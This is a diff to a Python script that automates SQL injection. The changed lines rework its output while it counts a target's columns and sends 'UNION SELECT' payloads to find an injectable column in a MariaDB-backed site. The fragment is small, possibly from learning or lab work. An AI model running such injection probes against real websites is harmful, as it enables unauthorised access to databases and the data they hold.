@@ -22,7 +22,7 @@ for x in (count):
     if "Unknown column" in r:
         x = (int(x))
         x = (x-1)
-        print(x,"number of columns usable")
+        print("number of columns usable",x)
         break
 
 
@@ -33,7 +33,7 @@ for i in range(1, x+1):
     query = url + "1 UNION SELECT " + ",".join(values) + "--"
     r = requests.get(query)
     if "MariaDB"  in r.text:
-        print("Column", (i), "is injectable")
+        print("Column", (i + 1), "is injectable")
         break 
     else:
         print("no columns are injectable")
